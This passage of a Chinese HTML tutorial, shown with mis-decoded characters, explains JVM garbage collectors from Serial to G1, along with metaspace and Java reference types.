title="Serialæ”¶é›†å™¨"></a>Serialæ”¶é›†å™¨</h4><p>è¿™æ¬¾åƒåœ¾æ”¶é›†å™¨ä¹Ÿæ˜¯å…ƒè€çº§åˆ«çš„æ”¶é›†å™¨äº†ï¼Œåœ¨JDK1.3.1ä¹‹å‰ï¼Œæ˜¯è™šæ‹Ÿæœºæ–°ç”Ÿä»£åŒºåŸŸæ”¶é›†å™¨çš„å”¯ä¸€é€‰æ‹©ã€‚è¿™æ˜¯ä¸€æ¬¾å•çº¿ç¨‹çš„åƒåœ¾æ”¶é›†å™¨ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå½“å¼€å§‹è¿›è¡Œåƒåœ¾å›æ”¶æ—¶ï¼Œéœ€è¦æš‚åœæ‰€æœ‰çš„çº¿ç¨‹ï¼Œç›´åˆ°åƒåœ¾æ”¶é›†å·¥ä½œç»“æŸã€‚å®ƒçš„æ–°ç”Ÿä»£æ”¶é›†ç®—æ³•é‡‡ç”¨çš„æ˜¯æ ‡è®°å¤åˆ¶ç®—æ³•ï¼Œè€å¹´ä»£é‡‡ç”¨çš„æ˜¯æ ‡è®°æ•´ç†ç®—æ³•ã€‚</p><p><img src="https://pb01.s3.bitiful.net/122.png" alt="avatar"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå½“è¿›å…¥åˆ°åƒåœ¾å›æ”¶é˜¶æ®µæ—¶ï¼Œæ‰€æœ‰çš„ç”¨æˆ·çº¿ç¨‹å¿…é¡»ç­‰å¾…GCçº¿ç¨‹å®Œæˆå·¥ä½œï¼Œå°±ç›¸å½“äºä½ æ‰“ä¸€æŠŠLOL 40åˆ†é’Ÿï¼Œä¸­é€”æ¯éš”1åˆ†é’Ÿç½‘ç»œå°±å¡5ç§’é’Ÿï¼Œå¯èƒ½è¿™æ—¶ä½ æ­£åœ¨æ‰“å›¢ï¼Œç»“æœä½ è¢«ç‰©ç†æ§åˆ¶ç›´æ¥åœ¨é‚£é‡Œç«™äº†5ç§’é’Ÿï¼Œè¿™ç¡®å®è®©äººéš¾ä»¥æ¥å—ã€‚</p><p>è™½ç„¶ç¼ºç‚¹å¾ˆæ˜æ˜¾ï¼Œä½†æ˜¯ä¼˜åŠ¿ä¹Ÿæ˜¯æ˜¾è€Œæ˜“è§çš„ï¼š</p><ol><li>è®¾è®¡ç®€å•è€Œé«˜æ•ˆã€‚</li><li>åœ¨ç”¨æˆ·çš„æ¡Œé¢åº”ç”¨åœºæ™¯ä¸­ï¼Œå†…å­˜ä¸€èˆ¬ä¸å¤§ï¼Œå¯ä»¥åœ¨è¾ƒçŸ­æ—¶é—´å†…å®Œæˆåƒåœ¾æ”¶é›†ï¼Œåªè¦ä¸é¢‘ç¹å‘ç”Ÿï¼Œä½¿ç”¨ä¸²è¡Œå›æ”¶å™¨æ˜¯å¯ä»¥æ¥å—çš„ã€‚</li></ol><p>æ‰€ä»¥ï¼Œåœ¨å®¢æˆ·ç«¯æ¨¡å¼ï¼ˆä¸€èˆ¬ç”¨äºä¸€äº›æ¡Œé¢çº§å›¾å½¢åŒ–ç•Œé¢åº”ç”¨ç¨‹åºï¼‰ä¸‹çš„æ–°ç”Ÿä»£ä¸­ï¼Œé»˜è®¤åƒåœ¾æ”¶é›†å™¨è‡³ä»Šä¾ç„¶æ˜¯Serialæ”¶é›†å™¨ã€‚</p><h4 id="Serial-Oldæ”¶é›†å™¨"><a href="#Serial-Oldæ”¶é›†å™¨" class="headerlink" title="Serial Oldæ”¶é›†å™¨"></a>Serial Oldæ”¶é›†å™¨</h4><p><strong>Serial æ”¶é›†å™¨çš„è€å¹´ä»£ç‰ˆæœ¬</strong>ï¼Œå®ƒåŒæ ·æ˜¯ä¸€ä¸ªå•çº¿ç¨‹æ”¶é›†å™¨ã€‚å®ƒä¸»è¦æœ‰ä¸¤å¤§ç”¨é€”ï¼šä¸€ç§ç”¨é€”æ˜¯åœ¨ JDK1.5 ä»¥åŠä»¥å‰çš„ç‰ˆæœ¬ä¸­ä¸ Parallel Scavenge æ”¶é›†å™¨æ­é…ä½¿ç”¨ï¼Œå¦ä¸€ç§ç”¨é€”æ˜¯ä½œä¸º CMS æ”¶é›†å™¨çš„åå¤‡æ–¹æ¡ˆã€‚</p><h4 id="ParNewæ”¶é›†å™¨"><a href="#ParNewæ”¶é›†å™¨" class="headerlink" title="ParNewæ”¶é›†å™¨"></a>ParNewæ”¶é›†å™¨</h4><p>è¿™æ¬¾åƒåœ¾æ”¶é›†å™¨ç›¸å½“äºæ˜¯Serialæ”¶é›†å™¨çš„å¤šçº¿ç¨‹ç‰ˆæœ¬ï¼Œå®ƒèƒ½å¤Ÿæ”¯æŒå¤šçº¿ç¨‹åƒåœ¾æ”¶é›†ï¼š</p><p><img src="https://pb01.s3.bitiful.net/123.png" alt="avatar"></p><p>é™¤äº†å¤šçº¿ç¨‹æ”¯æŒä»¥å¤–ï¼Œå…¶ä»–å†…å®¹åŸºæœ¬ä¸Serialæ”¶é›†å™¨ä¸€è‡´ï¼Œæ˜¯è®¸å¤šè¿è¡Œåœ¨ Server æ¨¡å¼ä¸‹çš„è™šæ‹Ÿæœºçš„é¦–è¦é€‰æ‹©ï¼Œæ–°ç”Ÿä»£é‡‡ç”¨æ ‡è®°-å¤åˆ¶ç®—æ³•ï¼Œè€å¹´ä»£é‡‡ç”¨æ ‡è®°-æ•´ç†ç®—æ³•ã€‚</p><h4 id="Parallel-Scavenge-Parallel-Oldæ”¶é›†å™¨"><a href="#Parallel-Scavenge-Parallel-Oldæ”¶é›†å™¨" class="headerlink" title="Parallel Scavenge/Parallel Oldæ”¶é›†å™¨"></a>Parallel Scavenge/Parallel Oldæ”¶é›†å™¨</h4><p>Parallel ScavengeåŒæ ·æ˜¯ä¸€æ¬¾é¢å‘æ–°ç”Ÿä»£çš„åƒåœ¾æ”¶é›†å™¨ï¼ŒåŒæ ·é‡‡ç”¨æ ‡è®°å¤åˆ¶ç®—æ³•å®ç°ï¼Œåœ¨JDK6æ—¶ä¹Ÿæ¨å‡ºäº†å…¶è€å¹´ä»£æ”¶é›†å™¨Parallel Oldï¼Œé‡‡ç”¨æ ‡è®°æ•´ç†ç®—æ³•å®ç°ï¼š</p><p><img src="https://pb01.s3.bitiful.net/124.png" alt="avatar"></p><p>ä¸ParNewæ”¶é›†å™¨ä¸åŒçš„æ˜¯ï¼Œå®ƒä¼šè‡ªåŠ¨è¡¡é‡ä¸€ä¸ªååé‡ï¼Œå¹¶æ ¹æ®ååé‡æ¥å†³å®šæ¯æ¬¡åƒåœ¾å›æ”¶çš„æ—¶é—´ï¼Œè¿™ç§è‡ªé€‚åº”æœºåˆ¶ï¼Œèƒ½å¤Ÿå¾ˆå¥½åœ°æƒè¡¡å½“å‰æœºå™¨çš„æ€§èƒ½ï¼Œæ ¹æ®æ€§èƒ½é€‰æ‹©æœ€ä¼˜æ–¹æ¡ˆã€‚</p><p>ç›®å‰JDK8é‡‡ç”¨çš„å°±æ˜¯è¿™ç§ Parallel Scavenge + Parallel Old çš„åƒåœ¾å›æ”¶æ–¹æ¡ˆã€‚</p><h4 id="CMSæ”¶é›†å™¨"><a href="#CMSæ”¶é›†å™¨" class="headerlink" title="CMSæ”¶é›†å™¨"></a>CMSæ”¶é›†å™¨</h4><p>åœ¨JDK1.5ï¼ŒHotSpotæ¨å‡ºäº†ä¸€æ¬¾åœ¨å¼ºäº¤äº’åº”ç”¨ä¸­å‡ ä¹å¯è®¤ä¸ºæœ‰åˆ’æ—¶ä»£æ„ä¹‰çš„åƒåœ¾æ”¶é›†å™¨ï¼šCMSï¼ˆConcurrent-Mark-Sweep,å³å¹¶è¡Œæ‰«ææ ‡è®°ï¼‰æ”¶é›†å™¨ï¼Œè¿™æ¬¾æ”¶é›†å™¨æ˜¯HotSpotè™šæ‹Ÿæœºä¸­ç¬¬ä¸€æ¬¾çœŸæ­£æ„ä¹‰ä¸Šçš„å¹¶å‘ï¼ˆæ³¨æ„è¿™é‡Œçš„å¹¶å‘å’Œä¹‹å‰çš„å¹¶è¡Œæ˜¯æœ‰åŒºåˆ«çš„ï¼Œå¹¶å‘å¯ä»¥ç†è§£ä¸ºåŒæ—¶è¿è¡Œç”¨æˆ·çº¿ç¨‹å’ŒGCçº¿ç¨‹ï¼Œè€Œå¹¶è¡Œå¯ä»¥ç†è§£ä¸ºå¤šæ¡GCçº¿ç¨‹åŒæ—¶å·¥ä½œï¼‰æ”¶é›†å™¨ï¼Œ<strong>å®ƒç¬¬ä¸€æ¬¡å®ç°äº†è®©åƒåœ¾æ”¶é›†çº¿ç¨‹ä¸ç”¨æˆ·çº¿ç¨‹åŒæ—¶å·¥ä½œ</strong>ã€‚</p><p>å®ƒä¸»è¦é‡‡ç”¨æ ‡è®°æ¸…é™¤ç®—æ³•ï¼š</p><p><img src="https://pb01.s3.bitiful.net/125.png" alt="avatar"></p><p>å®ƒçš„åƒåœ¾å›æ”¶åˆ†ä¸º4ä¸ªé˜¶æ®µï¼š</p><ul><li><strong>åˆå§‹æ ‡è®°ï¼š</strong> æš‚åœæ‰€æœ‰çš„å…¶ä»–çº¿ç¨‹ï¼Œå¹¶è®°å½•ä¸‹ç›´æ¥ä¸ root ç›¸è¿çš„å¯¹è±¡ï¼Œé€Ÿåº¦å¾ˆå¿« ï¼›</li><li><strong>å¹¶å‘æ ‡è®°ï¼š</strong> åŒæ—¶å¼€å¯ GC å’Œç”¨æˆ·çº¿ç¨‹ï¼Œç”¨ä¸€ä¸ªé—­åŒ…ç»“æ„å»è®°å½•å¯è¾¾å¯¹è±¡ã€‚ä½†åœ¨è¿™ä¸ªé˜¶æ®µç»“æŸï¼Œè¿™ä¸ªé—­åŒ…ç»“æ„å¹¶ä¸èƒ½ä¿è¯åŒ…å«å½“å‰æ‰€æœ‰çš„å¯è¾¾å¯¹è±¡ã€‚å› ä¸ºç”¨æˆ·çº¿ç¨‹å¯èƒ½ä¼šä¸æ–­çš„æ›´æ–°å¼•ç”¨åŸŸï¼Œæ‰€ä»¥ GC çº¿ç¨‹æ— æ³•ä¿è¯å¯è¾¾æ€§åˆ†æçš„å®æ—¶æ€§ã€‚æ‰€ä»¥è¿™ä¸ªç®—æ³•é‡Œä¼šè·Ÿè¸ªè®°å½•è¿™äº›å‘ç”Ÿå¼•ç”¨æ›´æ–°çš„åœ°æ–¹ã€‚</li><li><strong>é‡æ–°æ ‡è®°ï¼š</strong> é‡æ–°æ ‡è®°é˜¶æ®µå°±æ˜¯ä¸ºäº†ä¿®æ­£å¹¶å‘æ ‡è®°æœŸé—´å› ä¸ºç”¨æˆ·ç¨‹åºç»§ç»­è¿è¡Œè€Œå¯¼è‡´æ ‡è®°äº§ç”Ÿå˜åŠ¨çš„é‚£ä¸€éƒ¨åˆ†å¯¹è±¡çš„æ ‡è®°è®°å½•ï¼Œè¿™ä¸ªé˜¶æ®µçš„åœé¡¿æ—¶é—´ä¸€èˆ¬ä¼šæ¯”åˆå§‹æ ‡è®°é˜¶æ®µçš„æ—¶é—´ç¨é•¿ï¼Œè¿œè¿œæ¯”å¹¶å‘æ ‡è®°é˜¶æ®µæ—¶é—´çŸ­</li><li><strong>å¹¶å‘æ¸…é™¤ï¼š</strong> å¼€å¯ç”¨æˆ·çº¿ç¨‹ï¼ŒåŒæ—¶ GC çº¿ç¨‹å¼€å§‹å¯¹æœªæ ‡è®°çš„åŒºåŸŸåšæ¸…æ‰«ã€‚</li></ul><p>è™½ç„¶å®ƒçš„ä¼˜ç‚¹éå¸¸ä¹‹å¤§ï¼Œä½†æ˜¯ç¼ºç‚¹ä¹Ÿæ˜¯æ˜¾è€Œæ˜“è§çš„ï¼Œæˆ‘ä»¬ä¹‹å‰è¯´è¿‡ï¼Œæ ‡è®°æ¸…é™¤ç®—æ³•ä¼šäº§ç”Ÿå¤§é‡çš„å†…å­˜ç¢ç‰‡ï¼Œå¯¼è‡´å¯ç”¨è¿ç»­ç©ºé—´é€æ¸å˜å°‘ï¼Œé•¿æœŸè¿™æ ·ä¸‹æ¥ï¼Œä¼šæœ‰æ›´é«˜çš„æ¦‚ç‡è§¦å‘Full GCï¼Œå¹¶ä¸”åœ¨ä¸ç”¨æˆ·çº¿ç¨‹å¹¶å‘æ‰§è¡Œçš„æƒ…å†µä¸‹ï¼Œä¹Ÿä¼šå ç”¨ä¸€éƒ¨åˆ†çš„ç³»ç»Ÿèµ„æºï¼Œå¯¼è‡´ç”¨æˆ·çº¿ç¨‹çš„è¿è¡Œé€Ÿåº¦ä¸€å®šç¨‹åº¦ä¸Šå‡æ…¢ã€‚</p><p>ä¸è¿‡ï¼Œå¦‚æœä½ å¸Œæœ›çš„æ˜¯æœ€ä½çš„GCåœé¡¿æ—¶é—´ï¼Œè¿™æ¬¾åƒåœ¾æ”¶é›†å™¨æ— ç–‘æ˜¯æœ€ä½³é€‰æ‹©ï¼Œä¸è¿‡è‡ªä»G1æ”¶é›†å™¨é—®ä¸–ä¹‹åï¼ŒCMSæ”¶é›†å™¨ä¸å†æ¨èä½¿ç”¨äº†ã€‚</p><h4 id="Garbage-First-G1-æ”¶é›†å™¨"><a href="#Garbage-First-G1-æ”¶é›†å™¨" class="headerlink" title="Garbage First (G1) æ”¶é›†å™¨"></a>Garbage First (G1) æ”¶é›†å™¨</h4><p>æ­¤åƒåœ¾æ”¶é›†å™¨ä¹Ÿæ˜¯ä¸€æ¬¾åˆ’æ—¶ä»£çš„åƒåœ¾æ”¶é›†å™¨ï¼Œåœ¨JDK7çš„æ—¶å€™æ­£å¼èµ°ä¸Šå†å²èˆå°ï¼Œå®ƒæ˜¯ä¸€æ¬¾ä¸»è¦é¢å‘äºæœåŠ¡ç«¯çš„åƒåœ¾æ”¶é›†å™¨ï¼Œå¹¶ä¸”åœ¨JDK9æ—¶ï¼Œå–ä»£äº†JDK8é»˜è®¤çš„ Parallel Scavenge + Parallel Old çš„å›æ”¶æ–¹æ¡ˆã€‚</p><p>æˆ‘ä»¬çŸ¥é“ï¼Œæˆ‘ä»¬çš„åƒåœ¾å›æ”¶åˆ†ä¸º<code>Minor GC</code>ã€<code>Major GC</code>å’Œ<code>Full GC</code>ï¼Œå®ƒä»¬åˆ†åˆ«å¯¹åº”çš„æ˜¯æ–°ç”Ÿä»£ï¼Œè€å¹´ä»£å’Œæ•´ä¸ªå †å†…å­˜çš„åƒåœ¾å›æ”¶ï¼Œè€ŒG1æ”¶é›†å™¨å·§å¦™åœ°ç»•è¿‡äº†è¿™äº›çº¦å®šï¼Œå®ƒå°†æ•´ä¸ªJavaå †åˆ’åˆ†æˆ<code>2048</code>ä¸ªå¤§å°ç›¸åŒçš„ç‹¬ç«‹<code>Region</code>å—ï¼Œæ¯ä¸ª<code>Regionå—</code>çš„å¤§å°æ ¹æ®å †ç©ºé—´çš„å®é™…å¤§å°è€Œå®šï¼Œæ•´ä½“è¢«æ§åˆ¶åœ¨1MBåˆ°32MBä¹‹é—´ï¼Œä¸”éƒ½ä¸º2çš„Næ¬¡å¹‚ã€‚æ‰€æœ‰çš„<code>Region</code>å¤§å°ç›¸åŒï¼Œä¸”åœ¨JVMçš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸå†…ä¸ä¼šå‘ç”Ÿæ”¹å˜ã€‚</p><p>é‚£ä¹ˆåˆ†å‡ºè¿™äº›<code>Region</code>æœ‰ä»€ä¹ˆæ„ä¹‰å‘¢ï¼Ÿæ¯ä¸€ä¸ª<code>Region</code>éƒ½å¯ä»¥æ ¹æ®éœ€è¦ï¼Œè‡ªç”±å†³å®šæ‰®æ¼”å“ªä¸ªè§’è‰²ï¼ˆEdenã€Survivorå’Œè€å¹´ä»£ï¼‰ï¼Œæ”¶é›†å™¨ä¼šæ ¹æ®å¯¹åº”çš„è§’è‰²é‡‡ç”¨ä¸åŒçš„å›æ”¶ç­–ç•¥ã€‚æ­¤å¤–ï¼ŒG1æ”¶é›†å™¨è¿˜å­˜åœ¨ä¸€ä¸ªHumongousåŒºåŸŸï¼Œå®ƒä¸“é—¨ç”¨äºå­˜æ”¾å¤§å¯¹è±¡ï¼ˆä¸€èˆ¬è®¤ä¸ºå¤§å°è¶…è¿‡äº†Regionå®¹é‡ä¸€åŠçš„å¯¹è±¡ä¸ºå¤§å¯¹è±¡ï¼‰è¿™æ ·ï¼Œæ–°ç”Ÿä»£ã€è€å¹´ä»£åœ¨ç‰©ç†ä¸Šï¼Œä¸å†æ˜¯ä¸€ä¸ªè¿ç»­çš„å†…å­˜åŒºåŸŸï¼Œè€Œæ˜¯åˆ°å¤„åˆ†å¸ƒçš„ã€‚</p><p><img src="https://pb01.s3.bitiful.net/126.png" alt="avatar"></p><p>å®ƒçš„å›æ”¶è¿‡ç¨‹ä¸CMSå¤§ä½“ç±»ä¼¼ï¼š</p><p><img src="https://pb01.s3.bitiful.net/127.png" alt="avatar"></p><p>åˆ†ä¸ºä»¥ä¸‹å››ä¸ªæ­¥éª¤ï¼š</p><ul><li><p><strong>åˆå§‹æ ‡è®°ï¼ˆæš‚åœç”¨æˆ·çº¿ç¨‹ï¼‰ï¼š</strong>ä»…ä»…åªæ˜¯æ ‡è®°ä¸€ä¸‹GC Rootsèƒ½ç›´æ¥å…³è”åˆ°çš„å¯¹è±¡ï¼Œå¹¶ä¸”ä¿®æ”¹TAMSæŒ‡é’ˆçš„å€¼ï¼Œè®©ä¸‹ä¸€é˜¶æ®µç”¨æˆ·çº¿ç¨‹å¹¶å‘è¿è¡Œæ—¶ï¼Œèƒ½æ­£ç¡®åœ°åœ¨å¯ç”¨çš„Regionä¸­åˆ†é…æ–°å¯¹è±¡ã€‚è¿™ä¸ªé˜¶æ®µéœ€è¦åœé¡¿çº¿ç¨‹ï¼Œä½†è€—æ—¶å¾ˆçŸ­ï¼Œè€Œä¸”æ˜¯å€Ÿç”¨è¿›è¡ŒMinor GCçš„æ—¶å€™åŒæ­¥å®Œæˆçš„ï¼Œæ‰€ä»¥G1æ”¶é›†å™¨åœ¨è¿™ä¸ªé˜¶æ®µå®é™…å¹¶æ²¡æœ‰é¢å¤–çš„åœé¡¿ã€‚</p></li><li><p><strong>å¹¶å‘æ ‡è®°ï¼š</strong>ä»GC Rootå¼€å§‹å¯¹å †ä¸­å¯¹è±¡è¿›è¡Œå¯è¾¾æ€§åˆ†æï¼Œé€’å½’æ‰«ææ•´ä¸ªå †é‡Œçš„å¯¹è±¡å›¾ï¼Œæ‰¾å‡ºè¦å›æ”¶çš„å¯¹è±¡ï¼Œè¿™é˜¶æ®µè€—æ—¶è¾ƒé•¿ï¼Œä½†å¯ä¸ç”¨æˆ·ç¨‹åºå¹¶å‘æ‰§è¡Œã€‚</p></li><li><p><strong>æœ€ç»ˆæ ‡è®°ï¼ˆæš‚åœç”¨æˆ·çº¿ç¨‹ï¼‰ï¼š</strong>å¯¹ç”¨æˆ·çº¿ç¨‹åšä¸€ä¸ªçŸ­æš‚çš„æš‚åœï¼Œç”¨äºå¤„ç†å¹¶å‘æ ‡è®°é˜¶æ®µæ¼æ ‡çš„é‚£éƒ¨åˆ†å¯¹è±¡ã€‚</p></li><li><p><strong>ç­›é€‰å›æ”¶ï¼š</strong>è´Ÿè´£æ›´æ–°Regionçš„ç»Ÿè®¡æ•°æ®ï¼Œå¯¹å„ä¸ªRegionçš„å›æ”¶ä»·å€¼å’Œæˆæœ¬è¿›è¡Œæ’åºï¼Œæ ¹æ®ç”¨æˆ·æ‰€æœŸæœ›çš„åœé¡¿æ—¶é—´æ¥åˆ¶å®šå›æ”¶è®¡åˆ’ï¼Œå¯ä»¥è‡ªç”±é€‰æ‹©ä»»æ„å¤šä¸ªRegionæ„æˆå›æ”¶é›†ï¼Œç„¶åæŠŠå†³å®šå›æ”¶çš„é‚£ä¸€éƒ¨åˆ†Regionçš„å­˜æ´»å¯¹è±¡å¤åˆ¶åˆ°ç©ºçš„Regionä¸­ï¼Œå†æ¸…ç†æ‰æ•´ä¸ªæ—§Regionçš„å…¨éƒ¨ç©ºé—´ã€‚è¿™é‡Œçš„æ“ä½œæ¶‰åŠå­˜æ´»å¯¹è±¡çš„ç§»åŠ¨ï¼Œæ˜¯å¿…é¡»æš‚åœç”¨æˆ·çº¿ç¨‹ï¼Œç”±å¤šä¸ªæ”¶é›†å™¨çº¿ç¨‹å¹¶è¡Œå®Œæˆçš„ã€‚</p></li></ul><p>å®ƒå…·å¤‡ä»¥ä¸‹ç‰¹ç‚¹ï¼š</p><ul><li><strong>å¹¶è¡Œä¸å¹¶å‘ï¼š</strong>G1 èƒ½å……åˆ†åˆ©ç”¨ CPUã€å¤šæ ¸ç¯å¢ƒä¸‹çš„ç¡¬ä»¶ä¼˜åŠ¿ï¼Œä½¿ç”¨å¤šä¸ª CPUï¼ˆCPU æˆ–è€… CPU æ ¸å¿ƒï¼‰æ¥ç¼©çŸ­ Stop-The-World åœé¡¿æ—¶é—´ã€‚éƒ¨åˆ†å…¶ä»–æ”¶é›†å™¨åŸæœ¬éœ€è¦åœé¡¿ Java çº¿ç¨‹æ‰§è¡Œçš„ GC åŠ¨ä½œï¼ŒG1 æ”¶é›†å™¨ä»ç„¶å¯ä»¥é€šè¿‡å¹¶å‘çš„æ–¹å¼è®© java ç¨‹åºç»§ç»­æ‰§è¡Œã€‚</li><li><strong>åˆ†ä»£æ”¶é›†ï¼š</strong>è™½ç„¶ G1 å¯ä»¥ä¸éœ€è¦å…¶ä»–æ”¶é›†å™¨é…åˆå°±èƒ½ç‹¬ç«‹ç®¡ç†æ•´ä¸ª GC å †ï¼Œä½†æ˜¯è¿˜æ˜¯ä¿ç•™äº†åˆ†ä»£çš„æ¦‚å¿µã€‚</li><li><strong>ç©ºé—´æ•´åˆï¼š</strong>ä¸ CMS çš„â€œæ ‡è®°-æ¸…é™¤â€ç®—æ³•ä¸åŒï¼ŒG1 ä»æ•´ä½“æ¥çœ‹æ˜¯åŸºäºâ€œæ ‡è®°-æ•´ç†â€ç®—æ³•å®ç°çš„æ”¶é›†å™¨ï¼›ä»å±€éƒ¨ä¸Šæ¥çœ‹æ˜¯åŸºäºâ€œæ ‡è®°-å¤åˆ¶â€ç®—æ³•å®ç°çš„ã€‚</li><li><strong>å¯é¢„æµ‹çš„åœé¡¿ï¼š</strong>è¿™æ˜¯ G1 ç›¸å¯¹äº CMS çš„å¦ä¸€ä¸ªå¤§ä¼˜åŠ¿ï¼Œé™ä½åœé¡¿æ—¶é—´æ˜¯ G1 å’Œ CMS å…±åŒçš„å…³æ³¨ç‚¹ï¼Œä½† G1 é™¤äº†è¿½æ±‚ä½åœé¡¿å¤–ï¼Œè¿˜èƒ½å»ºç«‹å¯é¢„æµ‹çš„åœé¡¿æ—¶é—´æ¨¡å‹ï¼Œèƒ½è®©ä½¿ç”¨è€…æ˜ç¡®æŒ‡å®šåœ¨ä¸€ä¸ªé•¿åº¦ä¸º M æ¯«ç§’çš„æ—¶é—´ç‰‡æ®µå†…ï¼Œæ¶ˆè€—åœ¨åƒåœ¾æ”¶é›†ä¸Šçš„æ—¶é—´ä¸å¾—è¶…è¿‡ N æ¯«ç§’ã€‚</li></ul><hr><h3 id="å…ƒç©ºé—´"><a href="#å…ƒç©ºé—´" class="headerlink" title="å…ƒç©ºé—´"></a>å…ƒç©ºé—´</h3><p>JDK8ä¹‹å‰ï¼ŒHotspotè™šæ‹Ÿæœºçš„æ–¹æ³•åŒºå®é™…ä¸Šæ˜¯æ°¸ä¹…ä»£å®ç°çš„ã€‚åœ¨JDK8ä¹‹åï¼ŒHotspotè™šæ‹Ÿæœºä¸å†ä½¿ç”¨æ°¸ä¹…ä»£ï¼Œè€Œæ˜¯é‡‡ç”¨äº†å…¨æ–°çš„å…ƒç©ºé—´ã€‚ç±»çš„å…ƒä¿¡æ¯è¢«å­˜å‚¨åœ¨å…ƒç©ºé—´ä¸­ã€‚å…ƒç©ºé—´æ²¡æœ‰ä½¿ç”¨å †å†…å­˜ï¼Œè€Œæ˜¯ä¸å †ä¸ç›¸è¿çš„æœ¬åœ°å†…å­˜åŒºåŸŸã€‚æ‰€ä»¥ï¼Œç†è®ºä¸Šç³»ç»Ÿå¯ä»¥ä½¿ç”¨çš„å†…å­˜æœ‰å¤šå¤§ï¼Œå…ƒç©ºé—´å°±æœ‰å¤šå¤§ï¼Œæ‰€ä»¥ä¸ä¼šå‡ºç°æ°¸ä¹…ä»£å­˜åœ¨æ—¶çš„å†…å­˜æº¢å‡ºé—®é¢˜ã€‚è¿™é¡¹æ”¹é€ ä¹Ÿæ˜¯æœ‰å¿…è¦çš„ï¼Œæ°¸ä¹…ä»£çš„è°ƒä¼˜æ˜¯å¾ˆå›°éš¾çš„ï¼Œè™½ç„¶å¯ä»¥è®¾ç½®æ°¸ä¹…ä»£çš„å¤§å°ï¼Œä½†æ˜¯å¾ˆéš¾ç¡®å®šä¸€ä¸ªåˆé€‚çš„å¤§å°ï¼Œå› ä¸ºå…¶ä¸­çš„å½±å“å› ç´ å¾ˆå¤šï¼Œæ¯”å¦‚ç±»æ•°é‡çš„å¤šå°‘ã€å¸¸é‡æ•°é‡çš„å¤šå°‘ç­‰ã€‚</p><p>å› æ­¤åœ¨JDK8æ—¶ç›´æ¥å°†æœ¬åœ°å†…å­˜ä½œä¸ºå…ƒç©ºé—´ï¼ˆ<strong>Metaspace</strong>ï¼‰çš„åŒºåŸŸï¼Œç‰©ç†å†…å­˜æœ‰å¤šå¤§ï¼Œå…ƒç©ºé—´å†…å­˜å°±å¯ä»¥æœ‰å¤šå¤§ï¼Œè¿™æ ·æ°¸ä¹…ä»£çš„ç©ºé—´åˆ†é…é—®é¢˜å°±è®²è§£äº†ï¼Œæ‰€ä»¥æœ€ç»ˆå®ƒå˜æˆäº†è¿™æ ·ï¼š</p><p><img src="https://pb01.s3.bitiful.net/128.png" alt="avatar"></p><hr><h3 id="å…¶ä»–å¼•ç”¨ç±»å‹"><a href="#å…¶ä»–å¼•ç”¨ç±»å‹" class="headerlink" title="å…¶ä»–å¼•ç”¨ç±»å‹"></a>å…¶ä»–å¼•ç”¨ç±»å‹</h3><p><strong>1ï¼å¼ºå¼•ç”¨ï¼ˆStrongReferenceï¼‰</strong></p><p>ä»¥å‰æˆ‘ä»¬ä½¿ç”¨çš„å¤§éƒ¨åˆ†å¼•ç”¨å®é™…ä¸Šéƒ½æ˜¯å¼ºå¼•ç”¨ï¼Œè¿™æ˜¯ä½¿ç”¨æœ€æ™®éçš„å¼•ç”¨ã€‚å¦‚æœä¸€ä¸ªå¯¹è±¡å…·æœ‰å¼ºå¼•ç”¨ï¼Œé‚£å°±ç±»ä¼¼äºå¿…ä¸å¯å°‘çš„ç”Ÿæ´»ç”¨å“ï¼Œ<strong>åƒåœ¾å›æ”¶å™¨ç»ä¸ä¼šå›æ”¶å®ƒ</strong>ã€‚å½“å†…å­˜ç©ºé—´ä¸è¶³ï¼ŒJava è™šæ‹Ÿæœºå®æ„¿æŠ›å‡º OutOfMemoryError é”™è¯¯ï¼Œä½¿ç¨‹åºå¼‚å¸¸ç»ˆæ­¢ï¼Œä¹Ÿä¸ä¼šé éšæ„å›æ”¶å…·æœ‰å¼ºå¼•ç”¨çš„å¯¹è±¡æ¥è§£å†³å†…å­˜ä¸è¶³é—®é¢˜ã€‚</p><p><strong>2ï¼è½¯å¼•ç”¨ï¼ˆSoftReferenceï¼‰</strong><br>å¦‚æœä¸€ä¸ªå¯¹è±¡åªå…·æœ‰è½¯å¼•ç”¨ï¼Œé‚£å°±ç±»ä¼¼äºå¯æœ‰å¯æ— çš„ç”Ÿæ´»ç”¨å“ã€‚<strong>å¦‚æœå†…å­˜ç©ºé—´è¶³å¤Ÿï¼Œåƒåœ¾å›æ”¶å™¨å°±ä¸ä¼šå›æ”¶å®ƒï¼Œå¦‚æœå†…å­˜ç©ºé—´ä¸è¶³äº†ï¼Œå°±ä¼šå›æ”¶è¿™äº›å¯¹è±¡çš„å†…å­˜</strong>ã€‚åªè¦åƒåœ¾å›æ”¶å™¨æ²¡æœ‰å›æ”¶å®ƒï¼Œè¯¥å¯¹è±¡å°±å¯ä»¥è¢«ç¨‹åºä½¿ç”¨ã€‚è½¯å¼•ç”¨å¯ç”¨æ¥å®ç°å†…å­˜æ•æ„Ÿçš„é«˜é€Ÿç¼“å­˜ã€‚è½¯å¼•ç”¨å¯ä»¥å’Œä¸€ä¸ªå¼•ç”¨é˜Ÿåˆ—ï¼ˆReferenceQueueï¼‰è”åˆä½¿ç”¨ï¼Œå¦‚æœè½¯å¼•ç”¨æ‰€å¼•ç”¨çš„å¯¹è±¡è¢«åƒåœ¾å›æ”¶ï¼ŒJAVA è™šæ‹Ÿæœºå°±ä¼šæŠŠè¿™ä¸ªè½¯å¼•ç”¨åŠ å…¥åˆ°ä¸ä¹‹å…³è”çš„å¼•ç”¨é˜Ÿåˆ—ä¸­ã€‚</p><p><strong>3ï¼å¼±å¼•ç”¨ï¼ˆWeakReferenceï¼‰</strong><br>å¦‚æœä¸€ä¸ªå¯¹è±¡åªå…·æœ‰å¼±å¼•ç”¨ï¼Œé‚£å°±ç±»ä¼¼äºå¯æœ‰å¯æ— 